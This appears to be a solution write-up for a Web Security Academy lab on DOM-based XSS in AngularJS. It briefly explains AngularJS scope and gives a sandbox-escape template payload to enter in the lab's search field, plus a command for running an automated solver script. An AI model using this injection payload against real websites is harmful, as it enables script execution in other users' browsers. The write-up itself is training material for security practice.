# XSS LAB 11 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

## Manual Solution

### 1. What is AngularJs?
- AngularJS is a JavaScript framework for web development.
- AngularJS has not been supported since 2022.

### 2. What is scope?
- Scope is a core object in AngularJS.
- The scope is the binding part between the HTML and the JavaScript.
- The scope has default properties, and we can add our own properties to it
- To use scope properties in html we need to use {{ $example }}
```html
<body>
    <div ng-controller="MainController">
        <h1>{{ message }}</h1>
        <p id="p"></p>
    </div>
</body>
<script>
    var app = angular.module('myApp', []);

    app.controller('MainController', function($scope) {
        $scope.message = 'Hello, AngularJS!';
    });
</script>
```

### 3. Default Scope Properties
- Scope has default properties such as new(), on(), and eval().
- We can use these properties whenever needed.

### 4. Access the Lab
- Open the Web Security Academy lab environment in your browser.

### 5. Perform a search
- Perform a search using the following query: `{{$new.constructor('alert(1)')()}}`
- The constructor property is used to create a new function.
- () is used to invoke the function on the same line.

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command:
```sh
python xss_lab_11.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
``` 